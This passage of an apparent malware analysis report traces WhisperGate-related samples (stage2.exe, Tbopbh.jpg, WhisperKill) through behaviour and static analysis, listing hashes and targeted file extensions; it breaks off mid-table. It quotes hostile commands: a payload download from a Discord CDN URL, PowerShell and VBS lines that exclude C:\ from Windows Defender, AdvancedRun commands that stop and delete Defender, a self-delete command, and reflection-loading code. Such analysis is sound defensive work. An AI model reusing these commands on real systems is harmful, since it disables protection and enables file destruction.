<td>MinGW(GCC: (GNU) 6.3.0)[-]</td>
</tr>
<tr>
<th>Linker</th>
<td>GNU linker Id (GNU Binutils)(2.28)[Console32,console]</td>
</tr>
<tr>
<th>TimeDateStamp</th>
<td>1969-12-31 19:00:00</td>
</tr>
</tbody>
</table>
</div>
<p><code>asd.exe</code> is likely a development version of <code>stage1.exe</code>. While the behavior of <code>asd.exe</code> is similar to <code>stage1.exe</code>, the messages displayed were different.</p>
<h4><strong>stage2.exe</strong></h4>
<p><code>stage2.exe</code> was obtained from the C:\\ path of the Ukrainian victim’s Windows machine. <strong>Table 17</strong> lists the hashes and properties attributed to <code>stage2.exe</code>.</p>
<div>
<table>
<caption><em>Table 17: stage2.exe Properties</em></caption>
<tbody>
<tr>
<th>MD5</th>
<td>764f691b2168e8b3b6f9fb6582e2f819</td>
</tr>
<tr>
<th>SHA-256</th>
<td>aa79afbf82b06cda268664b7c83900d8f7a33e0f0071facba0b3d8f7a68ce56a</td>
</tr>
<tr>
<th>Library</th>
<td>.NET(v4.0.30319)[-]</td>
</tr>
<tr>
<th>Linker</th>
<td>Microsoft Linker(6.0)(GUI32,signed)</td>
</tr>
<tr>
<th>TimeDateStamp</th>
<td>2022-01-10 09:39:54</td>
</tr>
</tbody>
</table>
<p><strong>Table 18</strong> lists the following chronological observations when stage2.exe executes.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 18: stage2.exe Behavioral Analysis Observations</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Event</th>
<th role=\"columnheader\">Victim Observation</th>
</tr>
</thead>
<tbody>
<tr>
<td>PowerShell command executed twice</td>
<td><code>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" –enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMQAwAA==</code></td>
</tr>
<tr>
<td>Base64 UTF-16LE string decoded</td>
<td><code>Start-Sleep -s 10</code></td>
</tr>
<tr>
<td>HTTP GET request sent to Discord URL to download Tbopbh.jpg</td>
<td>
<p><code>hxxp://cdn.discordapp.com/attachments/</code></p>
<p><code>928503440139771947/930108637681184768/Tbopbh[.]jpg</code></p>
</td>
</tr>
<tr>
<td>Nmddfrqqrbyjeygggda.vbs created and executed within the %TEMP% directory</td>
<td>
<p>The Visual Basic Script (VBS) file contained the following command:</p>
<p><code>CreateObject(“WScript.Shell”).Run “powershell Set-MpPreference -ExclusionPath ‘C:\\’”, 0, False</code></p>
</td>
</tr>
<tr>
<td>AdvancedRun.exe created and executed twice</td>
<td>
<p><code>C:\\Users\\&lt;user&gt;\\AppData\\Local\\Temp\\AdvancedRun.exe” /EXEFilename “C:\\Windows\\System32\\sc.exe” /WindowState 0 /CommandLine “stop WinDefend”&nbsp; /StartDirectory “” /RunAs 8 /Run</code></p>
<p><code>C:\\Users\\&lt;user&gt;\\AppData\\Local\\Temp\\AdvancedRun.exe” /EXEFilename “C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe” /WindowState 0 /CommandLine “rmdir ‘C:\\ProgramData\\Microsoft\\Windows Defender’ –Recurse” /StartDirectory “” /RunAs 8 /Run</code></p>
</td>
</tr>
<tr>
<td>InstallUtil.exe created and executed; files corrupted following execution</td>
<td><code>C:\\Users\\&lt;user&gt;\\AppData\\Local\\Temp\\InstallUtil.exe</code></td>
</tr>
</tbody>
</table>
<h3>Static Analysis</h3>
<p>Static analysis was further conducted on two files (<code>stage2.exe</code>, <code>Tbopbh.jpg</code>) to uncover additional malware functionality and attributes.</p>
<h4><strong>stage2.exe</strong></h4>
<p>Static analysis was performed on a variant of stage2.exe; its hashes and properties are listed in <strong>Table 19</strong> below. Of note, the MD5 and SHA-256 hash values were different than those obtained from the Ukrainian victim machine (listed above in <strong>Table 17</strong>). Behavioral analysis was also performed on the below variant and both files exhibited the same behavior.</p>
<div>
<table>
<caption><em>Table 19: stage2.exe Variant Properties</em></caption>
<tbody>
<tr>
<th>MD5</th>
<td>14c8482f302b5e81e3fa1b18a509289d</td>
</tr>
<tr>
<th>SHA-256</th>
<td>dcbbae5a1c61dbbbb7dcd6dc5dd1eb1169f5329958d38b58c3fd9384081c9b78</td>
</tr>
<tr>
<th>Library</th>
<td>.NET(v4.0.30319)[-]</td>
</tr>
<tr>
<th>Linker</th>
<td>Microsoft Linker(6.0)(GUI32,signed)</td>
</tr>
<tr>
<th>TimeDateStamp</th>
<td>2022-01-10 09:39:54</td>
</tr>
</tbody>
</table>
<p>This variant of <code>stage2.exe</code> contained multiple layers of execution:</p>
<ul>
<li><code>stage2.exe</code> contained a WebClient object that was initialized with Discord URL <code>hxxps://cdn.discordapp.com/attachments/928503440139771947/930108637681184768/Tbopbh.jpg</code> to obtain the payload <code>Tbopbh.jpg</code>.</li>
<li><code>stage2.exe</code> contained logic to reverse file bytes of a file using the Array’s Reverse method.</li>
<li><code>stage2.exe</code> contained logic to load an Assembly object into a Stream object.</li>
<li><code>stage2.exe</code> used the reflection library to call method <code>Ylfwdwgmpilzyaph</code> from the loaded Assembly object.</li>
<li><code>stage2.exe</code> contained decryption logic that resembled RC4, a C# class produced a base64 string and an encryption class which created a key using the decoded string. The encryption class used encryption logic every 32 bytes to decrypt. Additionally, the XOR functionality occurred using the initialized byte “Array” shown below. The encryption class resembled RC4; it was used every 32 bytes. The base64 string came from a class that contained EazFuscator logic to obfuscate code by eliminating control flow within code, as well as making symbols difficult to analyze:
<ul>
<li><code>byte[] array = new byte[] {148, 68, 208, 52, 241, 93, 195, 220};</code></li>
</ul>
</li>
<li><code>stage2.exe</code> contained EazFuscator class logic. This included logic that built strings during runtime; otherwise, the full strings would have been obfuscated and further segmented when viewed statically. The following is an example of a built string:
<ul>
<li><code>UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMQAwAA==</code></li>
</ul>
</li>
<li>When the above string was base64 decoded, the system displayed the following PowerShell command: <code>Start-Sleep -s 10</code></li>
<li><code>stage2.exe</code> served as the downloader and driver logic for the malware payload, <code>Tbopbh.jpg</code>.</li>
</ul>
<h4><strong>Tbopbh.jpg (payload for stage2.exe variant)</strong></h4>
<p>An account in Discord Cluster 1 contained malware with the following hashes, labeled as Tbopbh.jpg:</p>
<ul>
<li>MD5: <code>b3370eb3c5ef6c536195b3bea0120929</code></li>
<li>SHA-256: <code>923eb77b3c9e11d6c56052318c119c1a22d11ab71675e6b95d05eeb73d1accd6</code></li>
</ul>
<p>When viewing payload <code>Tbopbh.jpg</code> using a hex editor, it ended with value “ZM” or hex values “5A 4D”—this indicated the payload was a reversed PE. Reversing the bytes of <code>Tbopbh.jpg</code> revealed the hashes of the resulting payload listed in <strong>Table 20</strong> below.</p>
<div>
<table>
<caption><em>Table 20: Tbopbh.jpg Properties</em></caption>
<tbody>
<tr>
<th>MD5</th>
<td>e61518ae9454a563b8f842286bbdb87b</td>
</tr>
<tr>
<th>SHA-256</th>
<td>9ef7dbd3da51332a78eff19146d21c82957821e464e8133e9594a07d716d892d</td>
</tr>
<tr>
<th>Protector</th>
<td>Eazfuscator(-)[-]</td>
</tr>
<tr>
<th>Library</th>
<td>.NET(v4.0.30319)[-]</td>
</tr>
<tr>
<th>Linker</th>
<td>Microsoft Linker(6.0)[DLL32]</td>
</tr>
<tr>
<th>TimeDateStamp</th>
<td>2022-01-10 09:39:31</td>
</tr>
</tbody>
</table>
<p>The original filename from the resulting payload was a Dynamic Link Library (DLL) file, <code>Frkmlkdkdubkznbkmcf.dll</code>; its attributes are listed in <strong>Table 21</strong>:</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 21: Frkmlkdkdubkznbkmcf.dll Attributes</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Resources</th>
<th role=\"columnheader\">Classes</th>
<th role=\"columnheader\">Methods&nbsp;</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>\\u2005 \\u2005 \\u2009 \\u2008 \\u2001 \\u2007 \\u2009 \\u200b \\u200a \\u2005</p>
<p><strong>Note:</strong> This format annotates action taken by EazFuscator to obfuscate items, making it difficult for malware analysts to review.</p>
</td>
<td>Main - ClassLibrary1</td>
<td>\\u0002</td>
</tr>
<tr>
<td>7c8cb5598e724d34384cce7402b11f0e</td>
<td>pc1eOx2WJVV1579235895 –</td>
<td>Ylfwdwgmpilzyaph</td>
</tr>
<tr>
<td>78c855a088924e92a7f60d661c3d1845</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<p><code>stage2.exe</code> was observed calling method <code>Ylfwdwgmpilzyaph</code> to begin decrypting resource <code>78c855a088924e92a7f60d661c3d1845</code>. The reflection library was used to execute method <code>Ylfwdwgmpilzyaph</code>, as shown in the following C# code block:</p>
<p><code>using System.Reflection;</code><br><code>string path = \"Frkmlkdkdubkznbkmcf.dll\";</code><br><code>string fqpn = Path.GetFullPath(path);</code><br><code>Assembly assembly = Assembly.LoadFile(fqpn);</code><br><code>Type type = assembly.GetType(\"ClassLibrary1.Main\");</code><br><code>type.InvokeMember(\"Ylfwdwgmpilzyaph\", BindingFlags.InvokeMethod, null, null, null);</code></p>
<p>The following application configuration accompanied the above code block to allow loading from remote sources:</p>
<p><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\" ?&gt;</code><br><code>&lt;configuration&gt;</code><br><code>&lt;runtime&gt;</code><br><code>&lt;loadFromRemoteSources enabled=\"true\"/&gt;</code><br><code>&lt;/runtime&gt;</code><br><code>&lt;/configuration&gt;</code></p>
<p>Upon invoking the method <code>Ylfwdwgmpilzyaph</code>, <code>Nmddfrqqrbyjeygggda.vbs</code> wrote to the Windows %TEMP% directory and has the following attributes, as listed in <strong>Table 22</strong> below.</p>
<div>
<table>
<caption><em>Table 22: Nmddfrqqrbyjeygggda.vbs Attributes</em></caption>
<tbody>
<tr>
<th>MD5</th>
<td>6eed4ee0cc57126e9a096ab9905f471c</td>
</tr>
<tr>
<th>SHA-256</th>
<td>db5a204a34969f60fe4a653f51d64eee024dbf018edea334e8b3df780eda846f</td>
</tr>
<tr>
<th>VBS Code</th>
<td>CreateObject(\"WScript.Shell\").Run \"powershell Set-MpPreference -ExclusionPath 'C:\\'\", 0, False</td>
</tr>
</tbody>
</table>
<p>The VBS code listed in <strong>Table 22</strong> used a WScript shell that executed as a Windows application, which ran a PowerShell command to exclude the C:\\ drive from Windows Defender's security checks. Malware analysts decoded and decrypted one of the resources from <code>Frkmlkdkdubkznbkmcf.dll</code> (<code>78c855a088924e92a7f60d661c3d1845</code>). Further analysis of <code>Frkmlkdkdubkznbkmcf.dll</code> resulted in an additional DLL file with the following hashes:</p>
<ul>
<li>MD5: <code>5a537673c34933fc854fbfb65477a686</code></li>
<li>SHA-256: <code>35feefe6bd2b982cb1a5d4c1d094e8665c51752d0a6f7e3cae546d770c280f3a</code></li>
</ul>
<p>This decrypted DLL file contained two resources, <code>AdvancedRun</code> and <code>Waqybg</code>.</p>
<ul>
<li><code>AdvancedRun</code><strong> </strong>(GZIP)
<ul>
<li>MD5: <code>de85ca91e1e8100a619de1c25112f1a5</code></li>
<li>SHA-256: <code>489ab4819830d231c3fc3572c5386cad9d18773a8121373ea8174de981cc9166</code></li>
</ul>
</li>
<li><code>Waqybg</code><strong> </strong>(GZIP)
<ul>
<li>Reversed byte order:
<ul>
<li>MD5: <code>9b1191f1ceddf312b0d609cd929c6631</code></li>
<li>SHA-256: <code>0dd61a16c625c49ffefaf4ce24cabf9a074028a06640d9bbb804f735ff56dfa3</code></li>
</ul>
</li>
<li>Original byte order:
<ul>
<li>MD5: <code>29d83f29c0b0a0b7499e71e7d5cb713f</code></li>
<li>SHA-256: <code>fd4a5398e55beacb2315687a75af5aa15b776b5d36b9800a1792ede3955616c2</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>Table 23</strong> and <strong>Table 24</strong> list the file properties for both the <code>AdvancedRun</code> and reversed <code>Waqybg</code> decompressed files.</p>
<div>
<table>
<caption><em>Table 23: AdvancedRun (decompressed)</em></caption>
<tbody>
<tr>
<th>Type</th>
<td>Win32 EXE</td>
</tr>
<tr>
<th>Company</th>
<td>NirSoft</td>
</tr>
<tr>
<th>TimeStamp</th>
<td>2020:08:03 09:41:38-04:00</td>
</tr>
<tr>
<th>Original File Name</th>
<td>AdvancedRun.exe</td>
</tr>
<tr>
<th>MD5</th>
<td>17fc12902f4769af3a9271eb4e2dacce</td>
</tr>
<tr>
<th>SHA-256</th>
<td>29ae7b30ed8394c509c561f6117ea671ec412da50d435099756bbb257fafb10b</td>
</tr>
</tbody>
</table>
<div>
<table>
<caption><em>Table 24: Waqybg (reversed; decompressed)</em></caption>
<tbody>
<tr>
<th>Type</th>
<td>Win32 EXE</td>
</tr>
<tr>
<th>TimeStamp</th>
<td>2022:01:10 03:14:38-05:00</td>
</tr>
<tr>
<th>MD5</th>
<td>3907c7fbd4148395284d8e6e3c1dba5d</td>
</tr>
<tr>
<th>SHA-256</th>
<td>34ca75a8c190f20b8a7596afeb255f2228cb2467bd210b2637965b61ac7ea907</td>
</tr>
<tr>
<th>Compiler</th>
<td>MinGW(GCC: (GNU) 6.3.0)[-]</td>
</tr>
<tr>
<th>Linker</th>
<td>GNU linker Id (GNU Binutils)(2.28)[Console32,console]</td>
</tr>
</tbody>
</table>
<p>The reversed and decompressed <code>Waqybg</code> files contained file corruption logic along with a final command to ping arbitrarily and delete itself: <code>cmd.exe /min /C ping 111.111.111.111 -n 5 -w 10 &gt; Nul &amp; Del /f /q “%s”</code>. <code>Waqybg</code> is known as WhisperKill—a malware downloaded by WhisperGate that destroys files with specific extensions.[<a href=\"https://cert.gov.ua/article/18419\">19</a>],[<a href=\"https://www.trendmicro.com/en_us/research/22/c/cyberattacks-are-prominent-in-the-russia-ukraine-conflict.html\">21</a>]</p>
<p>The following file extensions listed in <strong>Table 25&nbsp;</strong>were targeted for file corruption with the equivalent of the “wcscmp” C function logic (a string compare function). The corruption logic included overwriting 0x100000 or 1 MB worth of 0xcc values per targeted file.</p>
<table>
<caption><em>Table 25: File Extensions Targeted by WhisperKill</em></caption>
<tbody>
<tr>
<td><a>u\".3DM\"</a></td>
<td>u\".3DS\"</td>
<td>u\".602\"</td>
<td>u\".ACCDB\"</td>
<td>u\".ARC\"</td>
<td>u\".ASC\"</td>
</tr>
<tr>
<td>u\".ASM\"</td>
<td>u\".ASP\"</td>
<td>u\".ASPX\"</td>
<td>u\".BACKUP\"</td>
<td>u\".BAK\"</td>
<td>u\".BAT\"</td>
</tr>
<tr>
<td>u\".BMP\"</td>
<td>u\".BRD\"</td>
<td>u\".BZ2\"</td>
<td>u\".CGM\"</td>
<td>u\".CLASS\"</td>
<td>u\".CMD\"</td>
</tr>
<tr>
<td>u\".CONFIG\"</td>
<td>u\".CPP\"</td>
<td>u\".CRT\"</td>
<td>u\".CSR\"</td>
<td>u\".CSV\"</td>
<td>u\".DBF\"</td>
</tr>
<tr>
<td>u\".DCH\"</td>
<td>u\".DER\"</td>
<td>u\".DIF\"</td>
<td>u\".DIP\"</td>
<td>u\".DJVU.SH\"</td>
<td>u\".DOC\"</td>
</tr>
<tr>
<td>u\".DOCB\"</td>
<td>u\".DOCM\"</td>
<td>u\".DOCM\"</td>
<td>u\".DOCX\"</td>
<td>u\".DOT\"</td>
<td>u\".DOTM\"</td>
</tr>
<tr>
<td>u\".DOTX\"</td>
<td>u\".DWG\"</td>
<td>u\".EDB\"</td>
<td>u\".EML\"</td>
<td>u\".FRM\"</td>
<td>u\".GIF\"</td>
</tr>
<tr>
<td>u\".HDD\"</td>
<td>u\".HTM\"</td>
<td>u\".HWP\"</td>
<td>u\".IBD\"</td>
<td>u\".INC\"</td>
<td>u\".INI\"</td>
</tr>
<tr>
<td>u\".ISO\"</td>
<td>u\".JAR\"</td>
<td>u\".JAVA\"</td>
<td>u\".JPEG\"</td>
<td>u\".JPG\"</td>
<td>u\".JSP\"</td>
</tr>
<tr>
<td>u\".KDBX\"</td>
<td>u\".KEY\"</td>
<td>u\".LAY\"</td>
<td>u\".LAY6\"</td>
<td>u\".LDF\"</td>
<td>u\".LOG\"</td>
</tr>
<tr>
<td>u\".MAX\"</td>
<td>u\".MDB\"</td>
<td>u\".MDF\"</td>
<td>u\".MML\"</td>
<td>u\".MSG\"</td>
<td>u\".MYD\"</td>
</tr>
<tr>
<td>u\".MYI\"</td>
<td>u\".NEF\"</td>
<td>u\".NVRAM\"</td>
<td>u\".ODB\"</td>
<td>u\".ODG\"</td>
<td>u\".ODP\"</td>
</tr>
<tr>
<td>u\".ODS\"</td>
<td>u\".ODT\"</td>
<td>u\".OGG\"</td>
<td>u\".ONETOC2\"</td>
<td>u\".OST\"</td>
<td>u\".OTG\"</td>
</tr>
<tr>
<td>u\".OTP\"</td>
<td>u\".OTS\"</td>
<td>u\".OTT\"</td>
<td>u\".P12\"</td>
<td>u\".PAQ\"</td>
<td>u\".PAS\"</td>
</tr>
<tr>
<td>u\".PDF\"</td>
<td>u\".PEM\"</td>
<td>u\".PFX\"</td>
<td>u\".PHP\"</td>
<td>u\".PHP3\"</td>
<td>u\".PHP4\"</td>
</tr>
<tr>
<td>u\".PHP5\"</td>
<td>u\".PHP6\"</td>
<td>u\".PHP7\"</td>
<td>u\".PHPS\"</td>
<td>u\".PHTML\"</td>
<td>u\".PNG\"</td>
</tr>
<tr>
<td>u\".POT\"</td>
<td>u\".POTM\"</td>
<td>u\".POTX\"</td>
<td>u\".PPAM\"</td>
<td>u\".PPK\"</td>
<td>u\".PPS\"</td>
</tr>
<tr>
<td>u\".PPSM\"</td>
<td>u\".PPSX\"</td>
<td>u\".PPT\"</td>
<td>u\".PPTM\"</td>
<td>u\".PPTM\"</td>
<td>u\".PPTX\"</td>
</tr>
<tr>
<td>u\".PS1\"</td>
<td>u\".PSD\"</td>
<td>u\".PST\"</td>
<td>u\".RAR\"</td>
<td>u\".RAW\"</td>
<td>u\".RTF\"</td>
</tr>
<tr>
<td>u\".SAV\"</td>
<td>u\".SCH\"</td>
<td>u\".SHTML\"</td>
<td>u\".SLDM\"</td>
<td>u\".SLDX\"</td>
<td>u\".SLK\"</td>
</tr>
<tr>
<td>u\".SLN\"</td>
<td>u\".SNT\"</td>
<td>u\".SQ3\"</td>
<td>u\".SQL\"</td>
<td>u\".SQLITE3\"</td>
<td>u\".SQLITEDB\"</td>
</tr>
<tr>
<td>u\".STC\"</td>
<td>u\".STD\"</td>
<td>u\".STI\"</td>
<td>u\".STW\"</td>
<td>u\".SUO\"</td>
<td>u\".SVG\"</td>
</tr>
<tr>
<td>u\".SXC\"</td>
<td>u\".SXD\"</td>
<td>u\".SXI\"</td>
<td>u\".SXM\"</td>
<td>u\".SXW\"</td>
<td>u\".TAR\"</td>
</tr>
<tr>
<td>u\".TBK\"</td>
<td>u\".TGZ\"</td>
<td>u\".TIF\"</td>
<td>u\".TIFF\"</td>
<td>u\".TXT\"</td>
<td>u\".UOP\"</td>
</tr>
<tr>
<td>u\".UOT\"</td>
<td>u\".VBS\"</td>
<td>u\".VCD\"</td>
<td>u\".VDI\"</td>
<td>u\".VHD\"</td>
<td>u\".VMDK\"</td>
</tr>
<tr>
<td>u\".VMEM\"</td>
<td>u\".VMSD\"</td>
<td>u\".VMSN\"</td>
<td>u\".VMSS\"</td>
<td>u\".VMTM\"</td>
<td>u\".VMTX\"</td>
</tr>
<tr>
<td>u\".VMX\"</td>
<td>u\".VMXF\"</td>
<td>u\".VSD\"</td>
<td>u\".VSDX\"</td>
<td>u\".VSWP\"</td>
<td>u\".WAR\"</td>
</tr>
<tr>
<td>u\".WB2\"</td>
<td>u\".WK1\"</td>
<td>u\".WKS\"</td>
<td>u\".XHTML\"</td>
<td>u\".XLC\"</td>
<td>u\".XLM\"</td>
</tr>
<tr>
<td>u\".XLS\"</td>
<td>u\".XLSB\"</td>
<td>u\".XLSM\"</td>
<td>u\".XLSM\"</td>
<td>u\".XLSX\"</td>
<td>u\".XLT\"</td>
</tr>
<tr>
<td>u\".XLTM\"</td>
<td>u\".XLTX\"</td>
<td>u\".XLW\"</td>
<td>u\".YML\"</td>
<td>u\".ZIP\"</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<h4><strong>Malware Related to Tbopbh.jpg</strong></h4>
<p><code>stage2.exe</code> and its respective payload, <code>Tbopbh.jpg</code>, served as a template for other malware within Discord Cluster 1. While most of these other malware files have not been observed in open source reporting, malware analysts assess them as payloads that follow the unravelling process listed in <strong>Figure 1</strong> below.</p>



<figure class=\"c-figure c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">    <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-09/Figure%201%20-%20stage2.exe%20Execution%20Process%20Template.png?itok=0BWq6sPC\" width=\"1024\" height=\"619\" alt=\"Figure 1 - stage2.exe Execution Process Template\">



</div>
      <figcaption class=\"c-figure__caption\"><em>Figure 1: stage2.exe Execution Process Template</em></figcaption>
  </figure>
<p><strong>Table 26</strong> below provides a list of MD5 hashes for files found within Discord Cluster 1. When reversed, these files become DLL files, which were structured similarly to <code>Frkmlkdkdubkznbkmcf.dll</code>.</p>
<p><strong>Note:</strong> Analysts identified the files below in Discord Cluster 1; the files are staged on the Cluster in reversed byte order. Analysts reversed the file byte order for each file into their proper portable executable format, e.g., “Functional” format. The hashes in <strong>Table 26</strong> represent both byte orders.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 26: Files Located in Discord Cluster 1</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Filename</th>
<th role=\"columnheader\">MD5 (Reversed)</th>
<th role=\"columnheader\">MD5 (Functional)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Afgyyppsysmtddhvhhaw.dll</td>
<td>d034fe4c71b16b6d331886c24fef2751</td>
<td>4074798a621232dc448b65db7b1fdd66</td>
</tr>
<tr>
<td>Avbbwys.dll</td>
<td>422437f326b8dbe30cc5f103bde31f26</td>
<td>7f84263fd24f783ff72d5ae91011b558</td>
</tr>
<tr>
<td>Azkebvoyswvjnrpmn.dll</td>
<td>562c337b8caca330da2ea6ae07ee5db6</td>
<td>f73d203bdf924658fd6edf3444c93a50</td>
</tr>
<tr>
<td>Budoejokuqbge.dll</td>
<td>58e879213d81333b628434ba4aeb2751</td>
<td>08dfebc04eb61c9a6d87b6524c1c0f2e</td>
</tr>
<tr>
<td>Bwqdffttejlkeqe.dll</td>
<td>1c85c0d044ac837e8939564afac1eb32</td>
<td>8633bd2bbbb5da22c3f8751150186c42</td>
</tr>
<tr>
<td>Bxqbsyxfkjzmhdtfceoak.dll</td>
<td>7234da8ceafbe6586469f18c03cc1832</td>
<td>5f4df6dd8e644d59eaf182e500b5e7bf</td>
</tr>
<tr>
<td>Clsrncpbaucrabuobcpale.dll</td>
<td>618d62dd95fd9aeb855fe2ef1403dce5</td>
<td>955e4c198ee58e40fe92cb74ceefdf00</td>
</tr>
<tr>
<td>Cpdvzvzyghy.dll</td>
<td>d40195a444526eafb0db56d95bf8655d</td>
<td>a905d620717f75751aa94ceb88995dbc</td>
</tr>
<tr>
<td>Ctiktdfyauejxfak.dll</td>
<td>d06761b2cff86035a4838110ed6ab622</td>
<td>2ca6bcf16ee4293a771a1cf7b7b9ee49</td>
</tr>
<tr>
<td>Czxhayyankwsp.dll</td>
<td>59da31da4db1aa5f9a5c7c0c151422c8</td>
<td>de1bf141976776becd376a0dac400df6</td>
</tr>
<tr>
<td>Djpajq.dll</td>
<td>de1f9d1f0336ddcff832ad3900acd2f1</td>
<td>974e7c0b3660fbf18f29eac059f85ac0</td>
</tr>
<tr>
<td>Dmdtflkcgebf.dll</td>
<td>394e056cb6cb732dfd5e0d45d3dae938</td>
<td>4d8343c40be53d6521244fe74393d937</td>
</tr>
<tr>
<td>Ejcpaujkmvjndgqznimmkgd.dll</td>
<td>b7c1a8d39f46eaf52be90e24565dd6b0</td>
<td>7a70d5fbbafe3454b76e3ad2f009618f</td>
</tr>
<tr>
<td>Encuutwvdqbxlxh.dll</td>
<td>2b39eab325906b0a3ab7e584c3d67349</td>
<td>df4f856f783d23fb01af1e0e64bc0e20</td>
</tr>
<tr>
<td>Esalfjyraquwfxcgufwzip.dll</td>
<td>80f0ee332a452172533ad8863bb3bc63</td>
<td>f4f4e55a00d2f3a433c9e5624285ac1c</td>
</tr>
<tr>
<td>Fdgofjdvmmllgsxunb.dll</td>
<td>9345425cf07b4c39a80cd8540e08bfde</td>
<td>eef2363744345741e09fe5380eeb4df3</td>
</tr>
<tr>
<td>Fkhzvcuucaprsibp.dll</td>
<td>aecb57e20d2c0b0d9fece2cbcbcc3459</td>
<td>4bce4831b1dd71f19c55b3e3b5e99856</td>
</tr>
<tr>
<td>Fkthhyexkr.dll</td>
<td>58dc7c9577ff90a046359ca255c0c9f4</td>
<td>19cb20c4e7dbfe15c1aa284752d0fecb</td>
</tr>
<tr>
<td>Fqattuyxknkhv.dll</td>
<td>5c9e2195d10375b746b6717fdb47b5b9</td>
<td>2b5f159f022109a8de1bc5dd9e3138a0</td>
</tr>
<tr>
<td>Fqyubbzbubsge.dll</td>
<td>afbb9459d4a0f60d7ffb3b3532d11bc2</td>
<td>8d3d4d702ba6b4be2766a41bfe5ff76e</td>
</tr>
<tr>
<td>Frkmlkdkdubkznbkmcf.dll</td>
<td>b3370eb3c5ef6c536195b3bea0120929</td>
<td>e61518ae9454a563b8f842286bbdb87b</td>
</tr>
<tr>
<td>Gsiook.dll</td>
<td>a1b509254a0a1daa7e00d279ec974461</td>
<td>0e03103e8110785156105946e48ea9e0</td>
</tr>
<tr>
<td>Gutjuhi.dll</td>
<td>791a81f31a8e7090a7d5417451e09efa</td>
<td>fba76f4eb2e7a2eb17193bebe290a198</td>
</tr>
<tr>
<td>Hisvswmeswmnqbvzpoxzx.dll</td>
<td>e1a15bc13157134f542cd9c55c742460</td>
<td>c9d1677f4f89b95b41591b23a1dc1a63</td>
</tr>
<tr>
<td>Hsoahb.dll</td>
<td>cd62d4a178705b2b90a8babd8613df93</td>
<td>032f5642d4fb2fdd74e6f20a13c57746</td>
</tr>
<tr>
<td>Icyjkszdzgoxdfuwptkwxo.dll</td>
<td>f34f60375bebad861a35b7c4bb0fa1c8</td>
<td>a66b3b22a3619f739b197d0d443b700c</td>
</tr>
<tr>
<td>Jdfzavlqr.dll</td>
<td>7fe7f33d9b5dbdf3d032d2a10e39f283</td>
<td>8cfef66b390f08bdbfd940922cf51650</td>
</tr>
<tr>
<td>Jrdggfjvve.dll</td>
<td>b32e14a9b7de6c92cd16758fa6e23346</td>
<td>1220b580cef1bf22351e271773945d20</td>
</tr>
<tr>
<td>Jteieurqgvpgnhw.dll</td>
<td>b85538f665fdb6c8d9a74f2df7369832</td>
<td>ffa68749aa3fc6495e2c49b01d964339</td>
</tr>
<tr>
<td>Kbuqtmznmodjzvxvwxcvho.dll</td>
<td>869742fb9db71fdb66f00528fe2966ec</td>
<td>5b884f15dc9b072d7bbad9ec2b249f38</td>
</tr>
<tr>
<td>Kdmvyizz.dll</td>
<td>2128361d8aaae1225d50c9add32006a1</td>
<td>9152c9de57b5647ee4ab3dff551dc8dd</td>
</tr>
<tr>
<td>Kfxghcmg.dll</td>
<td>56e0446a6d7175a0d09110bc483ddbed</td>
<td>fc418fdda06ce5982153766dcefb71d9</td>
</tr>
<tr>
<td>Krewcizfplntbwcqawfhtfpd.dll</td>
<td>6a4fca88ee36fecc5113e188cc39d25c</td>
<td>5c3b0040e2dece6e17093ae607b79044</td>
</tr>
<tr>
<td>Lsurhpmpyewhv.dll</td>
<td>143594597130e301499e5940a5fb798a</td>
<td>911c7e82f32f78577dcd725a7adb114d</td>
</tr>
<tr>
<td>Mbkzrkfasxgxtzhgpgsehip.dll</td>
<td>993f01861aff306df44e6475f7886f37</td>
<td>e4634ef9bfe7b598b857ad997445b239</td>
</tr>
<tr>
<td>Mhnovdgzzidqx.dll</td>
<td>64b9feeccf6c183b9f7138f8fc53acbb</td>
<td>7e0c42d33921a89724424f17c97037bd</td>
</tr>
<tr>
<td>Mlfampnfnmjvjnahkrawwqd.dll</td>
<td>ddec2d79f460a881849037336ba8968f</td>
<td>d973210977957209f255b58eb1715b12</td>
</tr>
<tr>
<td>Mppveiyannobrcdlkd.dll</td>
<td>9606b4720a0e73ef1f00505a11aab2f7</td>
<td>0adc2530cf348c0a3d53a680291a3d67</td>
</tr>
<tr>
<td>Mzhyeemgqbmamubqn.dll</td>
<td>f772f5c65d65412f61ef5f2660e33ceb</td>
<td>f8ffd1eab6223e31b15d0fd6c3c0472e</td>
</tr>
<tr>
<td>Nbbudwt.dll</td>
<td>875f9200b49db08c33962b0a6bd05ab9</td>
<td>2e035360971a817b854d7d5a2b008717</td>
</tr>
<tr>
<td>Nhqcfzagulwaw.dll</td>
<td>fa97dbe84ce7717b754795fa89f13dce</td>
<td>601c12596dfea84c2113ae5ee59a52ec</td>
</tr>
<tr>
<td>Nlzhpvuzzoycqnnpl.dll</td>
<td>d8c04ecd646a1f8537a59f63518ef3c6</td>
<td>47f4534da421daf8089cf34d53f6bb6e</td>
</tr>
<tr>
<td>Noubvdigjlwsnqiylzgikkk.dll</td>
<td>3bcff990faacbebb8fb470dfe03e2543</td>
<td>683546b9171a1ea284a96d1b45d1d823</td>
</tr>
<tr>
<td>Nvxwbzciqarteyuz.dll</td>
<td>c265188fdadddb648629e8060601dca7</td>
<td>af85885a74cfe099676af542dcdc5741</td>
</tr>
<tr>
